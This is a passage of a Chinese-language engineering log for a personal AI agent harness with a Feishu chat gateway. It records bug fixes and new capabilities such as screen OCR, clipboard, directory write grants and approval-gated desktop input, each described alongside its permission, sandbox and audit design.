## 系统代理把飞书域名也劫持了（真机验收中途踩到）

验收中途本机 Clash 一类代理（`127.0.0.1:10090`）关了，随后所有飞书 REST 调用变成

```
ProxyError('Unable to connect to proxy', ... open.feishu.cn ...)
```

网关的长连接（WebSocket）不受影响，所以表现为“日志里连着，但发不出消息/下载不了附件”
——这种半死状态最难查。根因：`requests` 在 Windows 上从注册表读系统代理，飞书是境内
域名却被一起代理走。

修复：`bypass_proxy_for_feishu()` 把 `.feishu.cn / feishu.cn / open.feishu.cn /
msg-frontier.feishu.cn` 追加进 `NO_PROXY`，其他域名（如 OpenAI）仍按原代理走；
`FEISHU_USE_PROXY=1` 可关闭该行为。网关启动与验收脚本发卡前都会调用。

**踩到的坑**：第一版写成“先设 `NO_PROXY` 再 `pop('no_proxy')`”，Windows 上
`os.environ` 键不区分大小写，pop 直接把刚设的值删了，看起来“设了没用”。现在只在
非 Windows 上写小写别名。

回归：`test_bypass_proxy_for_feishu_keeps_other_traffic_proxied`（保留既有例外、
幂等）与 `..._can_be_disabled`。

## 审批合并卡 / 会话语义过滤 / 任务卡片

按用户要求依次做三个体验项。

**1. 审批合并（`src/feishu_approval_card.py`）**
一次批量操作可能同时产生十几条审批请求，旧实现一条一张卡。现在每个聊天只有一张
审批卡：逐条展示工具/原因/命令 + 自己的「允许 / 拒绝 / 同类」，超过 4 条折叠成
“另有 N 条未展开”，底部「全部允许 / 全部拒绝」。首次发送后记住 `message_id`，
决议一条就 PATCH 同一张，全部处理完显示“✅ 待审批已全部处理完”，按钮消失。
`poll_permissions` 只在**有变化**（新增请求 / 超时或别处已决议）时重渲染，
不会每 3 秒 PATCH 一次；无卡片能力的传输层回退成一条纯文本摘要。
安全边界不变：按钮只带 `req_id`，归属仍按“本聊天推送过的请求”校验；同类键仍由
服务端按登记内容重算；别人的聊天按不动（`test_bulk_button_from_another_chat_is_rejected`）。

**2. 会话列表（`feishu_sessions.list_card` + `_render_sessions`）**
工作区分组头带上会话数量与「当前工作区」标记，长路径只留尾部；底部新增
「只看当前工作区 / 显示全部工作区」切换（`action=scope`）。过滤只影响展示：
展示用的行写回 `_session_views`，因此按钮序号始终对应用户看到的顺序；完整列表留在
`_session_all`，来回切换不会丢条目。

**3. 后台任务卡片（`src/feishu_task_card.py`）**
`/status`、`/logs <id>` 从纯文本改成卡片：任务列表带「看日志 / 停止」，日志卡带
「刷新 / 任务列表 / 停止」，刷新与看日志都 PATCH 同一张卡（回调带 `message_id`），
日志只保留末尾 120 行 / 12k 字符。按钮走 `task_action` 分支，受用户白名单约束。

测试：`tests/test_feishu_approval_batch.py`（合并、折叠、批量、越权、无变化不重渲染）、
会话语义过滤与序号一致性、任务卡片渲染与按钮/白名单。全量 1678 passed / 1 skipped。

## 失败卡「重试」与帮助卡片

**失败卡重试**：402/401/超时这些常见失败以前只能看着文案重新打字。现在失败卡底部有
「🔄 重试这一次」（`retry_row()`，value `{"retry": true}`），网关记住该聊天最近一次
用户输入（`_last_user`，30 分钟 TTL），点一下就用**原来的会话**重跑。

顺手修了两个真问题：
1. **首请求就失败时根本没有卡片**：以前只有“已经有卡片”才更新成失败卡，402 一上来
   失败就回退成纯文本，重试按钮无处可放。现在补发一张失败卡。
2. **非流式回退时答案是纯文本**：没有 delta 的回合（非流式路径、一键重试）以前走
   `_reply`，同一功能在卡片/文本之间摇摆。现在补发最终卡片（带「控制台」）。

`_last_user` 只在内存里、按聊天覆盖、半小时过期；重试只是“再发一次同样的话”，
不缓存授权、不绕过回合槽，所以并发/忙碌行为与正常消息一致。

**帮助卡片**（`src/feishu_help_card.py`）：`/help` 从一大段文本变成 schema 2.0 卡片——
三句可照抄例句 + 「控制台 / 会话列表 / 定时任务 / 待审批 / 后台任务 / 停止回合」按钮，
命令清单收进折叠面板。没有 2.0 能力的传输层仍回退成原来的文本。

另：控制台「待审批」按钮（`panel=perms`）之前没有处理分支，点了会落到帮助；现已实现。

测试：重试会重跑原消息、TTL 过期提示、帮助卡按钮集合与折叠、无卡片能力回退、
`panel=perms` 空态。全量 1683 passed / 1 skipped。

## schema 2.0 不支持 action 标签（真机发卡当场暴露）

帮助卡第一次真机发送被飞书拒绝：

```
230099 Failed to create card content, ext=ErrCode: 200861;
ErrPath: ROOT -> body -> elements -> [3](tag: action);
ErrMsg: cards of schema V2 no longer support this capability
```

schema 2.0 的按钮必须放进 `column_set`/`column`，不能再用 1.0 的 `tag: "action"`。
修复：帮助卡底部两按钮改成 `column_set`。同时把这条规则写进验收校验器
（`schema 2.0` 出现 `action`/`note` 直接报错），并加回归
`test_schema_2_cards_never_use_action_tag` / `test_validator_rejects_action_tag_in_schema_2`
——本地校验器之前只查“tag 认不认识”，认不出“这个 tag 在这个 schema 里非法”，
所以没能提前拦住。

这正是 `--send-cards` 的价值：结构校验通过 ≠ 飞书接受。改完重新发送成功
（`om_x100b62d56faa...`）。

## emoji 把整个回合打死：GBK 控制台的 print

真机上一张失败卡写着：

```
处理未完成：{'detail': "'gbk' codec can't encode character '😊' in position 475: ...",
             'duration_ms': 39375, 'duration': '00:39'}
```

**不是模型、不是 provider、也不是飞书**：回合真的跑完了（39 秒），但回合路径里有人
`print()` 了含 emoji 的文本，而 API 进程的 stdout 重定向到日志文件、编码跟随系统
locale（中文 Windows = GBK），于是 `UnicodeEncodeError` 从 print 抛进 turn worker，
被 `api_streams` 的兜底 `except Exception` 记成 `detail`，最后变成“处理未完成”。

真实的 print 来源不止一个：`hooks.log_hook` 会打印工具输出前 100 字符
（`[HOOK] read(...) -> ...`）、非流式回复会打印 `message.content`、cron 会打印提示词。
任何一个里出现 😊 就能复现。

最小复现（不加固时返回 400，`detail` 与线上一致）：

```python
out = io.TextIOWrapper(io.BytesIO(), encoding='gbk'); sys.stdout = out
def run_turn(messages, **kw):
    print('[HOOK] read -> content 😊')
    return 'ok'
```

修复：新增 `src/console.py`，把 stdout/stderr 的 **errors** 改成 `backslashreplace`
（不重设 encoding，GBK 终端不会变乱码；编不了的字符写成 `😊`，日志里仍可辨认）。
在 `api.py`、`entrypoint.py`、`feishu_gateway.main()`、`gateway_sim.main()` 和
`harness_api.create_app()` 里调用，所以无论从哪个入口起进程都被兜住。

回归：`tests/test_console_encoding.py`（GBK 流写 emoji 不抛、转义可读、
无 reconfigure 的流保持原样、`[HOOK]` 打印路径、以及端到端的“回合返回 200 且答案是
含 emoji 的文本”）。全量 1690 passed / 1 skipped。

## 能力缺口盘点与下一阶段方案

按“personal agent 还缺哪些本机权限/操作”做了一次对照代码的盘点，并调研了 Codex / dots /
computer-use 各家做法，结论写进 `docs/PERSONAL_AGENT_ROADMAP.md`。

要点：
- 现状是「写有闸、读和网络近乎放开、桌面与系统层没碰」：`exec_policy` 三档三策略、
  `sandbox`（Windows Low IL）默认关；无截屏/OCR/剪贴板/键鼠/自启/本地通知；
  凭据在 `.env` 明文；无目录级持久授权与域名策略。
- Codex 的可复用设计：App Server（server 可主动发 approval 并暂停 turn）、
  sandbox 与 approval 双控制、`writable_roots`、网络 allow/deny + 未知域名审批、
  Starlark prefix rules、keyring 凭据、OTel 审计。
- dots 的可复用设计：**后台主动性只给只读工具**、Custom Rules 三态、auto-review、
  “改密码永远留给人”、随时可看它的电脑与 Activity View。
- 桌面控制三类形态（自己的桌面 / 云电脑 / 只控浏览器）差异很大；各家共识是
  prompt injection 是首要威胁、无人值守优先隔离、不可逆动作必须审批、全程留痕。
- 技术可行性本机已验证：`Windows.Media.Ocr` 可用且带 `zh-Hans-CN`；截屏/剪贴板/Toast/
  自启都能用 PowerShell/.NET/WinRT 零依赖实现（PyWinRT 4.x 要 Python≥3.11，我们是 3.10）。

方案分 P1–P6：P1 截屏+本地 OCR（地基，零依赖）、P2 自启+toast+空闲、P3a 剪贴板、
P3b 键鼠（默认关、需显式开启）、P4 权限模型 v2（目录级授权/域名策略/规则文件/auto-review）、
P5 浏览器（优先走 MCP）、P6 审计。含每阶段工具接口、权限与审批、测试与验收、风险缓解。

## P1 落地：截屏与本地 OCR（逐次审批，后台拒绝）

按路线图 P1 实现桌面观察，分三层：

- `src/screen_capture.py`：PowerShell + `System.Windows.Forms.Screen` /
  `Graphics.CopyFromScreen`，支持主屏/全部屏幕、`x,y,w,h` 区域、延迟与 DPI 感知；
  PNG 内容寻址（SHA1）落盘，附带 7 天清理与 `stats()`。
- `src/ocr_windows.py`：PowerShell + `Windows.Media.Ocr`。PowerShell 5.1 不能直接 await
  WinRT 的 `IAsyncOperation`，脚本里用反射拿 `AsTask` 再同步 `Wait()`；支持
  `zh-Hans-CN` / `auto`（跟随系统）、区域裁剪（`BitmapTransform.Bounds`，bbox 加回偏移）
  与行/词框合并。缺语言包时返回可用语言和
  `Get-WindowsCapability -Online -Name "Language.OCR*"` 提示，不返回空文本。
- `src/tool_screen.py`：工具层。`screen_capture` 返回 `ImageResult`，复用现有
  `expand_image_parts` 多模态链路；`screen_ocr` 默认读最近一张截图，并且**只接受
  `.cache/screenshots` 目录内的文件**，避免变成“识别任意图片”的后门。

安全口径（与路线图初稿的差异已回写文档）：

- 三种 sandbox 档位下屏幕工具一律 `screen_access` **逐次询问**，且不参与会话白名单；
  `never` 按 fail-closed 拒绝，只有 `danger-full-access` + `never` 放行，和既有语义一致。
- 后台 worker、定时任务（`SCHEDULED_FORBIDDEN_TOOLS`）和子代理工具面直接排除；
  `HARNESS_SCREEN_TOOLS=0` 在策略层硬拒。
- 审计只记路径/SHA1/尺寸/字符数，不记 OCR 文本。截图存 harness 缓存而不是工作区，
  避免被 checkpoint、补丁和文件检索扫到。

验证中踩到的两个坑：

1. 合成图片做 PowerShell 探针时只传了 `PATH` 和图片变量，进程以 `-65536` 退出；
   `System.Drawing` 还依赖 `SystemRoot` 等系统变量，后续统一传
   `{**os.environ, ...}`。
2. OCR 结果在 GBK 控制台显示成 `??`，检查码点（`0x4f60 0x597d…`）与 UTF-8 字节后确认
   只是终端显示问题，数据未损坏；这与之前的 emoji 事故是同一类现象。
3. ruff 报 PowerShell 脚本里三行 `E501`，把嵌套的 WinRT 调用拆成
   `$open/$read/$create` 中间变量（PowerShell 换行会断句，不能直接折行）。
4. 区域 OCR 的真机冒烟抓到一个假测试盖不住的 bug：`BitmapDecoder.GetSoftwareBitmapAsync`
   没有「只传 BitmapTransform」的单参数重载，脚本却写成了
   `GetSoftwareBitmapAsync($transform)`，实际报“找不到方法重载”。改用五参数重载
   （Bgra8 / Premultiplied / transform / IgnoreExifOrientation / DoNotColorManage），
   并补静态回归断言，防止脚本再被“简化”回去。区域裁剪后 bbox 已加回全图偏移。

测试新增 `tests/test_screen_capture.py`（11）、`tests/test_ocr_windows.py`（11）、
`tests/test_tool_screen.py`（9）、`tests/test_tool_screen_handlers.py`（3）、
`tests/test_screen_policy.py`（4），并更新 schema 快照（42 个工具，
SHA1 `1fb660f8…`）、exec policy、审批文案、定时只读、子代理排除与 `/status` 断言。
真机验证：320×200 区域截图 9306 字节、1 块屏幕，OCR 返回 5 行 21 字符且中文码点正确；
420×240 截图再按 `0,0,220,120` 裁剪识别，行框坐标正确加回了全图偏移。
全量 1735 passed / 1 skipped，ruff 通过。

## P1b 落地：截图回传飞书

需求：模型在飞书回合里截了屏，用户手机上也要看到原图，而不是只有文字结论。

- **API 侧只传元数据**：`src/turn_screenshots.py` 用回合开始前的文件字节偏移
  （`store.path.stat().st_size`）作为分界，回合结束后 `tail_events(after)` 只收集本回合新写的
  `screen_captured`，按 sha1 去重、默认最多 4 张；只返回 `<sha1>.png`、宽高与字节数，
  不返回 `path`。SSE `done` 与非流式消息响应都带上 `screenshots`。
- **受控下载**：`GET /v1/sessions/{id}/screenshots/{name}` 先校验会话存在，再用
  `^[0-9a-f]{40}\.png$` 校验文件名，拒绝符号链接，只从 `.cache/screenshots` 返回 PNG。
- **网关上传**：`GatewayClient` 新增 `on_screenshots` 回调和 `download_screenshot()`；
  `LarkTransport.send_image()` 通过 `im/v1/images` 上传（`image_type=message`），再以
  `msg_type=image` 回复原消息。回合成功后才发送，失败卡不发半套图。
- **边界与降级**：默认开启，每回合最多 4 张、单张飞书上限 10MB；截断/超限会回一句说明。
  下载或上传失败只打印日志，文字答复照常。`FEISHU_SEND_SCREENSHOTS=0` 可整体关闭。
  旧式 transport 没有 `send_image`、旧式 streamer 不接受 `on_screenshots` 时自动跳过。
- **测试**：新增 `tests/test_turn_screenshots.py`、`tests/test_screenshot_api.py`、
  `tests/test_feishu_screenshot_reply.py`，并扩展 `tests/test_gateway_sim.py`；
  覆盖字节偏移、去重上限、SSE/非流式元数据、下载路由 400/404/符号链接、图片上传与
  回复请求体、环境开关、4 张上限、10MB 跳过、下载/发送失败隔离、旧客户端兼容。
  全量 1762 passed / 2 skipped，ruff 通过；真机飞书上传仍需在配好 `im:resource`
  的应用上按验收单确认（本机测试用 fake Lark client 验证请求结构）。

未做：锁屏/UAC 安全桌面截图受系统限制，工具返回明确失败原因。

## P2a 落地：本地通知与空闲感知

常驻 personal agent 的第一块地基：飞书之外要有本地提醒，主动性任务要能判断用户是否空闲。

- **Toast 编码**：Windows PowerShell 5.1 在 GBK 控制台下读 UTF-8 脚本里的中文会解析失败，
  因此命令走 `-EncodedCommand`（UTF-16LE + base64），Toast XML 再单独 base64 后嵌进脚本；
  标题/正文先转义 XML 并剔控制字符与孤立代理项。AUMID 借用已真机验证的
  `{1AC14E77-…}\WindowsPowerShell\v1.0\powershell.exe`，无包身份也能弹。
- **限频与降级**：`notify()` 10 秒内最多一次，失败尝试也占名额（避免网关批量失败刷屏）；
  子进程超时/非零退出/`OSError` 都收敛成 `{sent: false, reason, error?}`，调用方无需 try。
  默认在 `win32` 开启，`HARNESS_NOTIFY=0` 关闭。
- **空闲/锁屏**：`GetLastInputInfo` 给出空闲秒数；`OpenInputDesktop` 拿不到输入桌面句柄即判锁屏。
  这是启发式——RDP 断开、UAC 安全桌面也会命中，但对「锁屏暂停截屏」足够。结果缓存 2 秒，
  失败也缓存，`HARNESS_IDLE=0` 关闭。
- **路由**：新增 `src/api_system.py` 的 `GET /v1/system/state`，返回 `{"idle": {...}}`，
  复用统一 Bearer 鉴权、限流和 access log。
- **测试**：新增 `tests/test_notify.py`、`tests/test_idle.py`、`tests/test_system_state_api.py`，
  覆盖命令编码与 XML 转义、限频/重置、环境开关、非 Windows、超时/非零退出/`OSError`、
  JSON 解析（BOM、null、非法 locked）、缓存与强制刷新、路由鉴权与快照透传。
  真机：`idle.state(force=True)` 返回 `idle_seconds=33, locked=false`；`notify()` 返回
  `sent=True` 且通知中心出现。全量 **1788 passed / 2 skipped**，ruff 通过。

未做：网关发送失败时自动调用本地通知（P2c）、按空闲触发主动性任务。

## P2b 落地：登录自启与监督进程

目标是把「两个终端 + 手动拉起」变成登录后自动常驻，并且启动失败能自己喊一声。

- **自启安装器** `scripts/install_autostart.py`：只做 `schtasks` 的 install/remove/status
  和 dry-run。任务名 `HarnessAgent`，`/SC ONLOGON /RL LIMITED /F`，当前用户、不提权；
  运行动作是 `"<pythonw.exe>" "<repo>/src/agent_service.py"`（没有 pythonw 时回退 python）。
  dry-run 用 `subprocess.list2cmdline()` 打印真实命令行，不碰系统；非 Windows 拒绝执行。
- **监督进程** `src/agent_service.py`：先起 `python -m uvicorn api:create_app --factory`，
  用 `/openapi.json` 探活（30 秒）；再起飞书网关（缺 `FEISHU_*` 时跳过）。子进程强制
  `PYTHONIOENCODING=utf-8` + `PYTHONUNBUFFERED=1`，日志分别写 `.cache/logs/api.log` /
  `feishu.log`，单个超过 10MB 时下次启动轮转为 `.1.log`。
- **失败路径**：缺 token、端口占用、API 未就绪、网关启动后退出都会发 error Toast 并结束；
  运行期任一子进程退出也会通知并返回码 4。默认**不自动重启**，避免坏配置下无限拉起。
  API + 网关都健康时发一条“Harness Agent 已就绪”（info，静音）。
- **pythonw 兼容**：计划任务用 pythonw 时 `sys.stdout/stderr` 可能是 `None`，入口先重定向到
  `.cache/logs/service.log` 再解析参数，避免第一条 print 就把进程炸掉。
- **测试**：`tests/test_install_autostart.py`（9）覆盖命令/quoting、dry-run 不执行、
  非 Windows 拒绝、pythonw 选择、status 已装/未装；`tests/test_agent_service.py`（13）
  覆盖启动顺序、网关 env、缺 token、端口占用、API/网关启动失败、子进程退出通知、
  Ctrl-C 返回 0、日志轮转与端口探测（全部用 fake Popen/probe，不启动真实服务）。
  真机只读验证：dry-run 输出含 `ONLOGON` 与 `pythonw.exe`；`status` 正确返回“未安装”。
  全量 **1810 passed / 2 skipped**，ruff 通过。

未做：`--restart-on-crash`；Task Scheduler `/End` 强制结束监督进程时的子进程清理
（普通退出/Ctrl+C 会 terminate，超时用 `kill_process_tree`；强制杀监督进程可能留下
API/网关孤儿，后续可用 Job Object 的 `KILL_ON_JOB_CLOSE` 补上）。

## P2c 落地：飞书失败降级本地通知

目标是飞书不可达时（断网、凭证失效、机器人被移出会话）人仍能在机器旁知道「有事没送出去」。

- **注入而非全局开关**：`FeishuGateway` 新增 `notifier` 参数，默认 `None`。只有入口
  `_run_gateway` 传 `notify.notify`；测试与库内直接构造网关不会弹真通知。
  `FEISHU_LOCAL_ALERTS=0` 可再关一层。
- **事件键去重**：`_local_alert(key, title, body)` 用 `time.monotonic()` 记录每个 key
  的最近弹出时间，120 秒窗口内同键只弹一次。远端故障通常是持续的，心跳 60 秒一轮、
  定时结果 15 秒一轮，不做去重会变成刷屏。不同 key（reply/watch/heartbeat/cron）互不影响。
- **四路覆盖**：`_reply` 在卡片失败回退文本后仍失败时告警并继续向上抛；`_watch_notify`
  告警后继续抛，让 `TurnWatcher` 按异常判定未送达并重试；`poll_heartbeat` /
  `poll_cron_results` 告警后继续 `continue`，不 ack、保留 pending 下一轮补发。
- **失败隔离**：notifier 自身抛错只打印一行日志并返回 False，不覆盖原始发送异常；
  告警正文截到 400 字符，避免把整段命令/摘要塞进 Toast。
- **测试**：新增 `tests/test_feishu_local_alerts.py`（13），覆盖四路失败告警、
  成功不告警、同键去重、不同键各一次、环境开关、无 notifier 保持旧行为、
  notifier 抛错隔离、正文截断；`test_main_allows_explicit_any_user_escape_hatch`
  同步断言入口注入 `notify.notify`。定向 139 passed；全量 **1823 passed / 2 skipped**，
  ruff 通过。

未做：Toast 点击后跳回飞书（目前只是系统通知）；网关自身掉线时没有常驻状态指示
（靠 API 监督进程的退出通知）。

## P2d 落地：定时任务的空闲门控

目标是让“主动性任务”等到人离开电脑再跑（整理记录、扫描文件、生成日报），
而不是到点就在用户正打字时抢回合。

- **数据模型**：`CronJob` 新增 `idle_after_s`（0 表示不门控）与
  `deferred_since`。两者都随 durable job 写入 `.cache/crons.json`，重启后
  仍知道“这次 occurrence 已经延后过”。
- **tick 语义**：到期且门控时先取空闲快照；`idle_ready()` 在
  `idle_seconds >= idle_after_s` 或锁屏时放行，探测不可用按“不空闲”处理。
  不满足就记 `deferred_since` 并跳过，等空闲后**补跑一次**（即使 cron 分钟已过）。
  延后超过 12 小时丢弃这次 occurrence，一次性任务直接移除，避免隔夜任务第二天
  突然执行。
- **探测成本**：`_has_due_idle_job()` 先在锁外判断“是否有门控任务到期或已延后”，
  没有就完全不探测；快照 30 秒缓存（测试可显式传 probe 绕过）。这样每秒一次的
  `tick()` 不会把 PowerShell 空闲探测打成热点。
- **锁粒度**：探测在拿 `cron_lock` 之前完成，避免持锁跑外部命令阻塞
  `schedule_job` / `cancel_job` / API 线程。
- **兼容性**：未门控任务走原分支，行为不变；`last_fired` 仍防同分钟重复；
  补跑后清空 `deferred_since`，不会重复补。延后/丢弃也只在涉及 durable job 时落盘。
- **暴露面**：API `idle_after_minutes`（0–1440，创建/更新可设，更新时清空延后）；
  模型工具 `schedule_cron(idle_after_minutes=...)` 与 `list_crons` 的
  `[空闲 ≥N 分钟]`；`GatewayClient.create_cron/update_cron` 透传；飞书任务卡片显示
  `空闲≥N分`；`_as_dict` 返回 `idle_after_s` 与 `deferred_since` 便于排障。
- **测试**：新增 `tests/test_cron_idle.py`（22），覆盖立即执行、忙碌延后、
  跨分钟补跑、一次性任务移除、锁屏视为空闲、探测异常/显式不可用、12 小时丢弃、
  非门控不探测、缓存与显式 probe、参数校验、更新清除延后，以及 API/gateway/
  工具/卡片/schema 契约。定向 cron/gateway/API 回归 137 + 75 通过；
  全量 **1845 passed / 2 skipped**，ruff 通过。

未做：门控只在派发前判断，入队后用户立刻回来仍可能执行（毫秒级窗口，可接受）；
没有“仅接通电源时执行”“仅工作日执行”等更细条件。

## P3a 落地：剪贴板读写

目标是让手机端能直接说“把我刚复制的发我”，同时不把剪贴板当成普通读工具放开。

- **能力层**：`src/clipboard_windows.py` 调 PowerShell 5.1。读取脚本用 `Get-Clipboard -Raw`
  取文本，把总字节数与 UTF-8 内容用 base64 写到 stdout（`<总字节>\n<base64>`）；写入把
  base64 经 stdin 传给 `Set-Clipboard`。两端都走 ASCII，不用 JSON/环境变量传文本，避开
  GBK 控制台转码和 Windows 环境变量长度上限；内容里出现引号、换行或中文都不会破坏命令。
- **截断**：读取侧先算原始 UTF-8 字节数，超过 200 KiB 只取前 200 KiB 再 base64；解码时
  截断场景用 `errors='ignore'`，未截断用 `errors='replace'`。工具层提示“已截断，只显示
  前 200 KiB”，审计同时记录 `total_bytes`、`chars` 与 `truncated`。
- **审批**：`clipboard_read` 归 `clipboard_access`、`clipboard_write` 归
  `clipboard_write`，三种档位都逐次询问，且不参与会话白名单——批准一次不该让本会话此后
  随便读剪贴板。`never` 下 fail-closed，`danger-full-access` + `never` 沿用既有语义放行。
  后台与定时回合在任何审批之前就拒绝；定时任务的只读工具面也排除；子代理工具面排除。
  `HARNESS_CLIPBOARD_TOOLS=0/off/false/no/disabled` 时在审批前直接硬拒。
- **审计**：事件只写 `bytes`/`chars`/`truncated`/`duration_ms`，不写内容、不写哈希——
  短密码的哈希同样可枚举。审批卡对写入只显示字符数和前 80 字预览（折叠空白），
  对读取只显示“读取当前剪贴板文本”。
- **工具面与展示**：schemas 追加两个工具（顺序即契约，快照更新为 44 个）；`/status`、
  `doctor` 与控制台面板显示开关状态；`feishu.env.example` 给出关闭开关。
- **测试**：新增 `tests/test_clipboard_windows.py`（9）、`tests/test_tool_clipboard.py`（7）、
  `tests/test_clipboard_policy.py`（8）：UTF-8/截断/空文本/异常输出/PowerShell 失败与超时/
  写入载荷与字符统计/非字符串拒绝/审计失败隔离，以及审批矩阵（read-only、
  workspace-write、never、danger-full-access）、环境关闭、后台拒绝、白名单绕过、
  定时只读面与可写定时任务的拒绝。定向剪贴板与接线 **108 passed**；策略与 schema
  回归 **236 passed**；全量 **1874 passed / 2 skipped**，ruff 通过。
- **真机验证**：只读调用返回 218 字节 / 172 字符 / 未截断 / 2.5 秒，未打印内容；真实写入
  刻意未执行，避免覆盖用户当前的剪贴板内容与格式。

未做：飞书端到端“把我刚复制的发我”尚未在真机走一遍（读能力已单独验证）；不处理图片/
文件/HTML 等非文本剪贴板格式；超长文本只返回前 200 KiB，没有“分段读取”入口。



## P4.1 落地：目录级持久写授权与撤销入口

目标是让“长期放行某个目录”不再靠改 `HARNESS_WORKSPACE_ROOTS` 重启，同时保持
“模型不能给自己扩权、人能一键收回”的边界。

- **账本**：新增 `src/grants.py`，`version: 1`，记录 `path` / `scope=write` /
  `expires` / `created_by` / `note` / `session_id` / `created_at`，存在
  `paths.cache_path('grants.json')`。所有写入走 `exclusive_file_lock` + 临时文件
  `replace`，避免并发 CLI/API 写坏。路径必须是**已存在、非文件系统根、非系统目录**的
  绝对路径；读取时跳过格式错误的记录，未知版本或 JSON 损坏时策略层按“无授权”处理
  （fail closed），而增删操作直接报错，不静默覆盖用户数据。
- **策略接入**：`exec_policy.Policy.evaluate` 增加 `write_grants`（已解析的 `Path`
  元组）与 `paths`。只在该档位为 `workspace-write` 时由 `hooks` 注入，且只影响
  `PATH_OUTSIDE` 的写入：命中授权目录或其子树才放行；秘密文件、系统目录仍硬拒，
  `read-only` 照旧询问。`apply_patch` 多文件时要求每个工作区外目标都被覆盖，工作区内
  目标不需要授权；bash 的写目标逐个过同一判定。`_grant_covers` 会重新分类路径，
  即使有人手改账本把 secret/system 目录写进去也不会放宽。
- **授权只能由人给**：CLI `/grants add|remove`、飞书 `/grants add|remove`、
  `POST /v1/grants` / `POST /v1/grants/remove`；模型工具面没有新增授权的入口。
  CLI 与飞书解析路径时不用 `shlex`（POSIX 转义会吃掉 Windows 反斜杠），自己按引号
  切分；`until YYYY-MM-DD` 与 `note ...` 为可选尾巴。
- **撤销面**：飞书 `/grants` 卡片每个目录一个「撤销授权」按钮，按钮带每次渲染生成的
  短 token（10 分钟、按聊天隔离），旧卡片/别的聊天重放只得到“已过期”；控制台面板显示
  `目录授权 N 个`。`/v1/permissions/revoke`、`/revoke` 和工具 `revoke_permissions`
  先撤会话白名单，再撤 `session_id` 等于当前会话的目录授权——人手动添加的全局授权
  （`session_id` 为空）不会被模型顺手清掉。审计写 `grant_added` / `grant_removed`，
  只在对应会话日志存在时追加。
- **可见性**：`/status` 与控制台显示条数，`--doctor` 打印生效授权数；`exec_policy`
  命中授权时返回 `path_grant` 理由，方便排障时区分“授权放行”和“工作区内写”。
- **测试**：新增 `tests/test_grants.py`（20），覆盖账本增删/幂等更新/过期/会话级撤销/
  损坏与未知版本、策略矩阵（工作区外、跨目录、秘密/系统、read-only、apply_patch 多路径、
  bash 兄弟目录）、hooks 注入时机、API 增删与审计、GatewayClient、工具撤销与审计；
  `tests/test_feishu_gateway.py` 新增 4 条（命令增删/参数拒绝/卡片 token/控制台计数）；
  `tests/test_ui_lifecycle.py` 新增 1 条 TUI `/grants` 增删与审计，并顺手覆盖了
  “新命令必须同时在 `ui/commands.py` 注册”的回归。schema 只改描述不改工具数
  （仍 44 个，快照 SHA1 更新为 `cc00ce9f1b7191bd76a7e96bc093e016b2065d0e`）。
  定向 grants/schema/tool/CLI/Feishu/TUI **170 passed**；全量 **1899 passed / 2 skipped**，
  ruff 通过。

未做：域名与工具级授权（账本里预留 `scope` 概念但只实现 `write`）；卡片上直接输入路径
（飞书回调不带表单值，新增仍走命令）；授权变更的全局审计检索（P6 再做）。


## P3b 落地：显式审批的桌面键鼠控制

修复全量测试时发现 `tests/conftest.py` 有两个同名 `_isolate_cron_state` fixture：Python 只保留后定义者，
导致负责重定向 `DURABLE_PATH` 的 fixture 被覆盖，cron 测试写进真实 `.cache/crons.json` 并在 Windows 上偶发
`PermissionError`。已分别改名为 `_isolate_cron_durable_path` / `_isolate_cron_jobs`；`tests/test_cron_idle.py`
定向回归 **22 passed**，测试不再指向真实持久文件。

P3b 增加 `src/desktop_control_windows.py` 能力层与 `src/tool_desktop.py` 工具层：
- `desktop_snapshot` 读前台窗口标题、进程/PID/HWND、窗口矩形与 UIA 焦点控件；不截屏，屏幕图像仍走单独审批的 `screen_capture`。
- `desktop_action` 一次执行一个 `move/click/type/key/scroll`；PowerShell 5.1 + user32 `SendInput`，文本以 UTF-8/base64 参数传输并逐 UTF-16 字符发送。
- 输入动作绑定先前 snapshot 的 PID + HWND，运行时重新读取 foreground；切窗即拒绝。鼠标坐标还必须落在 snapshot 窗口矩形和虚拟桌面内。参数限制：输入 ≤1000 字符，滚轮 ±20 格，键名采用白名单。
- 所有调用默认关闭，需 `HARNESS_DESKTOP_CONTROL=1`；开后每项都走人工审批，不接受“同类”会话预授权；`approval_policy=never` 仍拒绝。后台/定时与子代理拒绝；Recovery 将动作列为 destructive，不自动重试。
- UIA `IsPassword` 与标题/进程/焦点上的敏感词只作为启发式防误操作；它不是可靠的支付页检测或 OS 安全边界。桌面共享会话存在输入竞争窗口，不用于登录、支付、改密码、2FA 或无人值守流程。
- 审计记录成功/失败的动作类型、PID/HWND、标题哈希、耗时/短错误，不落键入文本。`/status` 显示控制开关。

新增测试覆盖后端 payload、键鼠参数边界、窗口身份契约、默认关闭/never 档、逐次审批、后台拒绝、审计脱敏和 cron 隔离。定向 **70 passed**；全量 **1921 passed / 2 skipped**，ruff 通过。

**未做真机桌面输入**：当前进程运行环境不能由自动化用例安全验证键鼠副作用。实际启用前需用户在自己的飞书/CLI交互会话中显式配置环境变量，第一次仅对记事本测试，且逐步核对审批卡和目标窗口。敏感窗口拦截不可当作保证。


## P3b 复审修复 + 动作序列（2026-10-26）

复审 7034c23 的桌面控制实现，用惰性探针（纯 PowerShell 语义测试、stdout 字节转储、DPI 前后
对比）实锤三个缺陷后修复：

1. **`$pid` 撞只读自动变量 `$PID`**：`Get-WindowState` 里 `$pid = [uint32]0` 在
   `$ErrorActionPreference='Stop'` 下必抛“无法覆盖变量 PID”，此前**每次 snapshot/action 都会
   失败**。探针：`try { $pid=[uint32]0 } catch { … }` → CAUGHT。已改名 `$procId`。单测没抓到
   是因为 runner 全注入、脚本只做字符串断言——运行时契约现在靠两条腿：契约断言（脚本内禁止
   `$pid =`）+ 真机只读冒烟。
2. **stdout GBK**：重定向的 PowerShell 5.1 输出走 OEM 码页（探针：`中文` → `d6 d0 ce c4`），
   Python 按 UTF-8 解码后中文窗口标题全是 U+FFFD。改为脚本输出单个 base64(UTF-8 JSON) 行
   （与 clipboard 模块同一模式），Python 侧 `b64decode(validate=True)` + UTF-8 解码，控制台
   码页彻底不碰载荷。
3. **DPI 不对齐**：desktop 脚本未调 `SetProcessDPIAware`，与 `screen_capture`（显式调用）坐标
   系可能不一致（本机 100% 缩放不触发，探针前后均 1440x960）。已对齐为物理像素。

顺手修：`scroll` 前把光标 clamp 进目标窗口矩形（滚轮落在光标所在窗口，可能滚错）；snapshot
无前台窗口时 `_state_text` 透出 `error`（原来只显示 unknown 占位）；`run_desktop_action` 类型
注解补 `| None`。

**动作序列**：`desktop_action` 新增 `action=sequence` + `steps`（1–12 步，每步
